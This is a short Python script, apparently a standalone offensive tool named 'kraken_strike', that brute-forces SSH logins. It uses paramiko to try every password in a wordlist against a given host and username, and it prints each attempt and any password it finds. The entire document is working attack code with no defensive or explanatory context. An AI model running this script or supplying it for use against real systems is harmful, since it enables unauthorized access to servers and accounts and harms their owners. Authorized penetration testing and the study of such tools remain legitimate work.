import paramiko, socket, sys

def kraken_strike(ip, user, wordlist):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            try:
                print(f"[*] Testing: {user}:{password}")
                client.connect(ip, username=user, password=password, timeout=2)
                print(f"\n[🔥] SUCCESS! PASSWORD FOUND: {password}")
                return password
            except paramiko.AuthenticationException: continue
            except socket.error: return "Host Down"
    return "Not Found"

if __name__ == "__main__":
    if len(sys.argv) > 3:
        kraken_strike(sys.argv[1], sys.argv[2], sys.argv[3])
